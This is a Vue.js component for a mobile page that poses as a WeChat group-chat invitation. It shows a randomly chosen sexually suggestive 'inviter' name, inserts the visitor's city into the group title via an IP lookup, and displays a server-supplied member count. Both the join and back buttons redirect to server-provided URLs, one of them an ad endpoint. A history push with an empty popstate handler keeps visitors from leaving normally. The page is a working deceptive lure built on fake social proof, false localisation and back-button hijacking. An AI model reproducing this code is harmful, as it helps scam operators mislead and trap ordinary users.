<template>
  <div id="main">
    <div id="wrappers">
      <div id="scrollers">
        <div class="ui-header">
          <div class="ui-back" @click="show(1)">
            <i class="fa fa-angle-left fa-lg" aria-hidden="true"></i>
            返回
          </div>
        </div>
        <div class="main">
          <div class="ui-logo"></div>
          <div class="ui-title" v-cloak>{{title}}</div>
          <div class="ui-num" v-cloak ref="c">{{enrollment}}人</div>
        </div>
    <!--    <Footer :invitor = invitor></Footer>-->
        <div class="ui-footer">
          <div class="ui-invite" v-cloak>{{invitor}} 邀请你加入群聊</div>
          <input type="button" value="加入群聊" class="ui-btn" @click="show(2)">
          <div class="ui-role">
            <p>1.您和群里其他人都不是朋友关系，请注意隐私安全。</p>
            <p>2.该群聊人数较多，为减少新信息给您带来的打扰，建议进群后屏蔽消息通知。</p>
          </div>
        </div>
      </div>
    </div>
  </div>


</template>
<style>
  @import '../assets/style/main.less';
</style>
<script>
  //import Header from "../components/Header";
  import userAgent from "../utils/userAgent";
  //import Footer from "../components/Footer";
  //import Global from "../utils/global";
  export default {
    components: {/*Header*/},
    name: 'Main',
    data () {
      return {
        title: '*',
        enrollment: '*',
        invitor : '*',
        wxid : this.$route.query.wxid,
        url : ''
      }
    },
    created() {
      var self = this;
      self.$vux.loading.show()
      self.getApi();
      let name = ["辞予","那一夜","床摇得厉害","你的呻吟","甜腻","强哥","七尺大乳","漂洋过海","用贞操换真钞","清晨的眼泪","孟老师","性感↗小娘们","孤寂","淫领风骚","小影","爱到深处て腿自开","无心","吻我杀我","林萌"];
      let index2 = Math.floor((Math.random()*name.length));
      self.invitor = name[index2];

    },
    methods:{

      getApi(){
        let self = this;
        let city = IpQuery.city,
            province = IpQuery.province,
            _str = '';

        if(city){
          _str = city.replace(/市/, '');
        }else{
          _str = province.replace(/省/, '');
        }

        self.$http.post(global.baseUrl+global.url.chatGetTitle,{}).then(res => {
          if(res.status){
            self.$vux.loading.hide()
            self.title = res.data.title.replace(/city/, _str);
            self.enrollment = res.data.enrollment;
            /*self.invitor = res.data.invitor;*/
            self.$http.post(global.baseUrl+global.url.domain_skip,{
              type: 'C1'
            }).then(res => {
              this.url = res.data+'?t=s';
            });
          }
        });

      },
      jumpFun(){

      },
      show(_t){
        if(_t == 1){
          let self = this;
          self.$http.get("/emsTest/index/adv/AinterfaceS",{}).then(res => {
            window.location.href = res.data.url;
          });
        }else{
          window.location.href = this.url;
        }

      }
    },
    mounted(){
      let myScroll1;
      loaded();
      function loaded () {
        myScroll1 = new IScroll('#wrappers', { mouseWheel: true, click: false, taps:true });
      }

      document.addEventListener('touchmove', function (e) { e.preventDefault(); }, isPassive() ? {
        capture: false,
        passive: false
      } : false);



      let self = this,
          _url = window.location.href;

      //监听返回
      pushHistory();
      window.addEventListener("popstate", function(e) {
        self.jumpFun();
      }, false);

      function pushHistory() {
        var state = {
          title: "title",
          url: _url
        };
        window.history.pushState(state, "title", _url);
      }

    }
  }
</script>
